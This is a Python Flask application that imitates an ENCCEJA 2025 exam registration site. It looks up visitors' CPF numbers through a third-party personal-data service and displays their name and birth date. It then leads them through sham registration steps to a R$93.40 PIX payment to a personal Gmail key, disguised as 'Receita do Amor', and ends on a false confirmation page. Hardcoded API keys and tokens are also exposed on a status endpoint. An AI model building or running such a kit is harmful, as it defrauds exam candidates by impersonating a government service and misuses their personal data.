import os
import functools
import time
import re
import random
import string
import json
import http.client
import subprocess
import logging
import urllib.parse
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
import secrets
import qrcode
import qrcode.constants
import base64
from io import BytesIO
import requests

app = Flask(__name__)

# In-memory store for payment status (in production, use Redis or database)
payment_status_store = {}

# Domínio autorizado - Permitindo todos os domínios para VPS
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Permita acesso independente do referer para VPS
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# WitePay Gateway Integration (inline)
class WitePayGateway:
    """
    WitePay Payment Gateway Integration
    Handles order creation and PIX payment generation
    """
    
    def __init__(self):
        self.api_key = os.environ.get('WITEPAY_API_KEY', 'sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d')
        self.api_base_url = "https://api.witepay.com.br/v1"
        
        app.logger.info("WitePay gateway inicializado com sucesso")
    
    def _get_headers(self):
        """Get headers for API requests"""
        return {
            'x-api-key': self.api_key,
            'Content-Type': 'application/json'
        }
    
    def create_order(self, client_data, product_data):
        """
        Create a new order in WitePay
        """
        try:
            # Prepare order payload
            order_payload = {
                "productData": [
                    {
                        "name": product_data.get('name', 'Receita do Amor'),
                        "value": product_data.get('value', 9340)  # R$ 93.40 em centavos
                    }
                ],
                "clientData": {
                    "clientName": client_data.get('clientName'),
                    "clientDocument": client_data.get('clientDocument'),
                    "clientEmail": client_data.get('clientEmail', 'gerarpagamentos@gmail.com'),
                    "clientPhone": client_data.get('clientPhone', '11987790088')
                }
            }
            
            app.logger.info(f"Criando pedido WitePay para cliente: {client_data.get('clientName')}")
            app.logger.debug(f"Order payload: {order_payload}")
            
            # Make API request to create order
            response = requests.post(
                f"{self.api_base_url}/order/create",
                json=order_payload,
                headers=self._get_headers(),
                timeout=30
            )
            
            app.logger.info(f"WitePay order response status: {response.status_code}")
            app.logger.debug(f"Order response text: {response.text}")
            
            if response.status_code == 200 or response.status_code == 201:
                order_data = response.json()
                app.logger.info(f"Pedido criado com sucesso: {order_data.get('orderId', 'N/A')}")
                return {
                    'success': True,
                    'data': order_data
                }
            else:
                app.logger.error(f"Erro ao criar pedido WitePay: {response.text}")
                return {
                    'success': False,
                    'error': f"API error: {response.status_code} - {response.text}"
                }
                
        except Exception as e:
            app.logger.error(f"Exception ao criar pedido WitePay: {str(e)}")
            return {
                'success': False, 
                'error': str(e)
            }
    
    def create_charge(self, order_id, payment_method="pix"):
        """
        Create a charge for an existing order - WitePay PIX
        """
        try:
            charge_payload = {
                "paymentMethod": payment_method
            }
            
            app.logger.info(f"Criando cobrança WitePay para pedido: {order_id}")
            app.logger.debug(f"Charge payload: {charge_payload}")
            
            # Make API request to create charge
            response = requests.post(
                f"{self.api_base_url}/charge/create/{order_id}",
                json=charge_payload,
                headers=self._get_headers(),
                timeout=30
            )
            
            app.logger.info(f"WitePay charge response status: {response.status_code}")
            app.logger.debug(f"Charge response text: {response.text}")
            
            if response.status_code == 200 or response.status_code == 201:
                charge_data = response.json()
                app.logger.info(f"Cobrança criada com sucesso: {charge_data.get('chargeId', 'N/A')}")
                return {
                    'success': True,
                    'data': charge_data
                }
            else:
                app.logger.error(f"Erro ao criar cobrança WitePay: {response.text}")
                return {
                    'success': False,
                    'error': f"API error: {response.status_code} - {response.text}"
                }
                
        except Exception as e:
            app.logger.error(f"Exception ao criar cobrança WitePay: {str(e)}")
            return {
                'success': False,
                'error': str(e)
            }

# Initialize WitePay Gateway
witepay_gateway = WitePayGateway()

def get_payment_gateway():
    """Return the WitePay gateway"""
    return witepay_gateway

def generate_qr_code(pix_code):
    """Generate QR code from PIX code"""
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(pix_code)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return f"data:image/png;base64,{img_str}"
    except Exception as e:
        app.logger.error(f"Erro ao gerar QR code: {e}")
        return None

def generate_pix_fallback(user_data, amount=93.40):
    """Generate PIX code directly when WitePay fails"""
    try:
        transaction_id = f"ENCCEJA{int(time.time())}"
        pix_key = "gerarpagamentos@gmail.com"
        merchant_name = "Receita do Amor - ENCCEJA"
        merchant_city = "SAO PAULO"
        
        # Build PIX code according to Brazilian Central Bank standard
        pix_base = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
        
        # Calculate CRC16
        def calculate_crc16(data):
            crc = 0xFFFF
            for byte in data.encode('utf-8'):
                crc ^= byte << 8
                for _ in range(8):
                    if crc & 0x8000:
                        crc = (crc << 1) ^ 0x1021
                    else:
                        crc <<= 1
                    crc &= 0xFFFF
            return f"{crc:04X}"
        
        crc = calculate_crc16(pix_base + "6304")
        pix_code_final = pix_base + "6304" + crc
        
        app.logger.info(f"PIX fallback gerado - ID: {transaction_id}")
        
        return {
            'success': True,
            'pixCode': pix_code_final,
            'qr_code': pix_code_final,
            'transactionId': transaction_id,
            'amount': amount
        }
        
    except Exception as e:
        app.logger.error(f"Erro no PIX fallback: {e}")
        return {
            'success': False,
            'error': str(e)
        }

@app.route('/')
@app.route('/index')
@check_referer
def index():
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
@check_referer  
def inscricao():
    """Página de inscrição com formulário CPF"""
    app.logger.info("Renderizando página de inscrição")
    try:
        return render_template('inscricao.html')
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template inscricao.html: {e}")
        # Fallback caso template não exista
        return redirect(url_for('inscricao_fallback'))

@app.route('/inscricao-fallback')
def inscricao_fallback():
    """Fallback da inscrição caso template não exista"""
    return '''
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ENCCEJA 2025 - Inscrição</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
            .header { background: #0066cc; color: white; padding: 20px; text-align: center; border-radius: 10px; margin-bottom: 20px; }
            .form-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .form-group { margin: 20px 0; }
            label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
            input[type="text"] { width: 100%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 5px; }
            .btn { background: #28a745; color: white; padding: 15px 30px; font-size: 16px; border: none; cursor: pointer; border-radius: 5px; width: 100%; }
            .btn:hover { background: #218838; }
            .loading { display: none; color: #007bff; margin: 10px 0; }
            .resultado { margin: 20px 0; padding: 15px; border-radius: 5px; }
            .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
            .error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
            .continue-btn { background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 15px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>ENCCEJA 2025</h1>
            <p>Exame Nacional para Certificação de Competências de Jovens e Adultos</p>
        </div>
        
        <div class="form-box">
            <h2>Consultar CPF</h2>
            <form id="cpfForm" onsubmit="consultarCPF(event)">
                <div class="form-group">
                    <label>Digite seu CPF:</label>
                    <input type="text" id="cpfInput" placeholder="000.000.000-00" maxlength="14" required>
                </div>
                
                <button type="submit" class="btn">Consultar CPF</button>
                <div class="loading" id="loading">Consultando dados na base oficial...</div>
            </form>
            
            <div id="resultado"></div>
        </div>
        
        <script>
        function formatarCPF(cpf) {
            return cpf.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{2})/, '$1.$2.$3-$4');
        }
        
        document.getElementById('cpfInput').oninput = function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length <= 11) {
                e.target.value = formatarCPF(value);
            }
        };
        
        function consultarCPF(event) {
            event.preventDefault();
            
            const cpfInput = document.getElementById('cpfInput');
            const loading = document.getElementById('loading');
            const resultado = document.getElementById('resultado');
            
            const cpf = cpfInput.value.replace(/\\D/g, '');
            
            if (cpf.length !== 11) {
                alert('CPF deve ter 11 dígitos');
                return;
            }
            
            loading.style.display = 'block';
            resultado.innerHTML = '';
            
            fetch('/consultar-cpf-inscricao?cpf=' + cpf)
            .then(response => response.json())
            .then(data => {
                loading.style.display = 'none';
                if (data.sucesso) {
                    resultado.innerHTML = 
                        '<div class="resultado success">' +
                        '<h3>CPF Encontrado!</h3>' +
                        '<p><strong>Nome:</strong> ' + data.nome + '</p>' +
                        '<p><strong>CPF:</strong> ' + data.cpf + '</p>' +
                        '<p><strong>Data Nascimento:</strong> ' + data.dataNascimento + '</p>' +
                        '<a href="/encceja-info" class="continue-btn">Continuar Inscrição</a>' +
                        '</div>';
                } else {
                    resultado.innerHTML = '<div class="resultado error"><strong>Erro:</strong> ' + data.error + '</div>';
                }
            })
            .catch(error => {
                loading.style.display = 'none';
                resultado.innerHTML = '<div class="resultado error"><strong>Erro na consulta:</strong> Tente novamente</div>';
                console.error('Erro:', error);
            });
        }
        </script>
    </body>
    </html>
    '''

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API (para a página de inscrição) - URL CORRIGIDA"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API funcionando com URL corrigida
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        app.logger.info(f"Consultando API CPF: {url}")
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"Resposta da API CPF: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': dados.get('telefone', ''),
                    'email': dados.get('email', ''),
                    'sucesso': True
                }
                
                # Salvar na sessão
                session['user_data'] = user_data
                
                app.logger.info(f"CPF consultado com sucesso: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": f"Erro de conexão com a API: {response.status_code}", "sucesso": False}), 500
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF na API: {str(e)}")
        return jsonify({"error": f"Erro interno: {str(e)}", "sucesso": False}), 500

@app.route('/encceja-info')
@check_referer
def encceja_info():
    """Informações sobre o ENCCEJA"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    try:
        return render_template('encceja-info.html', user_data=session['user_data'])
    except:
        return redirect(url_for('validar_dados'))

@app.route('/validar-dados')
@check_referer
def validar_dados():
    """Validação de dados pessoais"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    try:
        return render_template('validar-dados.html', user_data=session['user_data'])
    except:
        return redirect(url_for('endereco'))

@app.route('/salvar-validacao', methods=['POST'])
@check_referer
def salvar_validacao():
    """Salvar validação e ir para endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    return redirect(url_for('endereco'))

@app.route('/endereco')
@check_referer
def endereco():
    """Formulario de endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    try:
        return render_template('endereco.html')
    except:
        return redirect(url_for('salvar_endereco'))

@app.route('/salvar-endereco', methods=['POST'])
@check_referer
def salvar_endereco():
    """Salvar endereco na sessao"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    endereco_data = {
        'cep': request.form.get('cep', '01000-000'),
        'cidade': request.form.get('cidade', 'São Paulo'),
        'uf': request.form.get('uf', 'SP')
    }
    
    session['endereco_data'] = endereco_data
    return redirect(url_for('local_prova'))

@app.route('/local-prova')
@check_referer
def local_prova():
    """Selecao do local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    try:
        return render_template('local-prova.html')
    except:
        return redirect(url_for('pagamento'))

@app.route('/salvar-local', methods=['POST'])
@check_referer
def salvar_local():
    """Salvar local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    local = request.form.get('local', 'escola1')
    session['local_prova'] = local
    return redirect(url_for('pagamento'))

@app.route('/pagamento', methods=['GET', 'POST'])
@app.route('/pagamento/')
@check_referer
def pagamento():
    """Página de pagamento PIX"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando página de pagamento")
    try:
        return render_template('pagamento.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template pagamento: {e}")
        # Fallback caso template não exista
        return redirect(url_for('inscricao_sucesso'))

# API para criar pagamento PIX usando WitePay
@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    """Criar pagamento PIX usando WitePay"""
    try:
        user_data = session.get('user_data', {})
        
        if not user_data:
            return jsonify({'success': False, 'error': 'Dados do usuário não encontrados'}), 400
        
        # Dados do cliente
        client_data = {
            'clientName': user_data.get('nome', 'Cliente ENCCEJA'),
            'clientDocument': user_data.get('cpf', '00000000000').replace('.', '').replace('-', ''),
            'clientEmail': 'gerarpagamentos@gmail.com',
            'clientPhone': '11987790088'
        }
        
        # Dados do produto - ENCCEJA R$ 93,40
        product_data = {
            'name': 'Receita do Amor',
            'value': 9340  # R$ 93,40 em centavos
        }
        
        app.logger.info(f"Criando pagamento PIX para {client_data['clientName']}")
        
        # Tentar criar pedido no WitePay
        order_result = witepay_gateway.create_order(client_data, product_data)
        
        if order_result['success']:
            order_id = order_result['data'].get('orderId')
            
            if order_id:
                # Criar cobrança PIX
                charge_result = witepay_gateway.create_charge(order_id, "pix")
                
                if charge_result['success']:
                    charge_data = charge_result['data']
                    pix_code = charge_data.get('pixCode') or charge_data.get('qr_code')
                    
                    if pix_code:
                        qr_code_image = generate_qr_code(pix_code)
                        
                        payment_info = {
                            'success': True,
                            'transactionId': charge_data.get('chargeId', f"ENCCEJA{int(time.time())}"),
                            'pixCode': pix_code,
                            'qr_code': pix_code,
                            'qrCodeImage': qr_code_image,
                            'amount': 93.40,
                            'method': 'witepay'
                        }
                        
                        app.logger.info(f"PIX WitePay criado com sucesso: {payment_info['transactionId']}")
                        return jsonify(payment_info)
        
        # Se WitePay falhar, usar fallback
        app.logger.warning("WitePay falhou, usando PIX fallback")
        fallback_result = generate_pix_fallback(user_data, 93.40)
        
        if fallback_result['success']:
            qr_code_image = generate_qr_code(fallback_result['pixCode'])
            fallback_result['qrCodeImage'] = qr_code_image
            fallback_result['method'] = 'fallback'
            
            app.logger.info(f"PIX fallback criado: {fallback_result['transactionId']}")
            return jsonify(fallback_result)
        
        return jsonify({'success': False, 'error': 'Erro ao gerar PIX'}), 500
        
    except Exception as e:
        app.logger.error(f"Erro ao criar PIX: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/inscricao-sucesso')
@check_referer
def inscricao_sucesso():
    """Pagina de sucesso"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    try:
        return render_template('inscricao-sucesso.html', user_data=session['user_data'])
    except:
        # Fallback simples
        user_data = session['user_data']
        return f'''
        <html>
        <head><title>ENCCEJA 2025 - Inscrição Concluída</title></head>
        <body style="font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px;">
            <div style="background: #28a745; color: white; padding: 20px; text-align: center; border-radius: 10px;">
                <h1>Inscrição Realizada com Sucesso!</h1>
                <p>ENCCEJA 2025</p>
            </div>
            <div style="background: white; padding: 30px; margin-top: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                <h2>Parabéns, {user_data.get('nome', 'Candidato')}!</h2>
                <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                <p><strong>Valor:</strong> R$ 93,40</p>
                <p><strong>Status:</strong> Inscrição confirmada!</p>
                <p>Guarde esta confirmação para seus registros.</p>
            </div>
        </body>
        </html>
        '''

# Rota de status do sistema
@app.route('/status')
def status():
    """Status do sistema"""
    return jsonify({
        'status': 'online',
        'projeto': 'ENCCEJA 2025 Original Corrigido',
        'api_cpf': 'https://consulta.fontesderenda.blog/cpf.php',
        'token': '1285fe4s-e931-4071-a848-3fac8273c55a',
        'payment': 'WitePay + Fallback PIX',
        'witepay_key': 'sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    """Health check"""
    return "OK - ENCCEJA 2025 Original", 200

if __name__ == '__main__':
    app.logger.info("=== ENCCEJA 2025 - PROJETO ORIGINAL CORRIGIDO ===")
    app.logger.info("✅ Mantém toda funcionalidade original")
    app.logger.info("✅ Remove dependências problemáticas")
    app.logger.info("✅ API CPF corrigida")
    app.logger.info("✅ WitePay integrado inline")
    app.logger.info("✅ Templates com fallback")
    app.logger.info("✅ Fluxo completo preservado")
    app.run(host='0.0.0.0', port=5000, debug=True)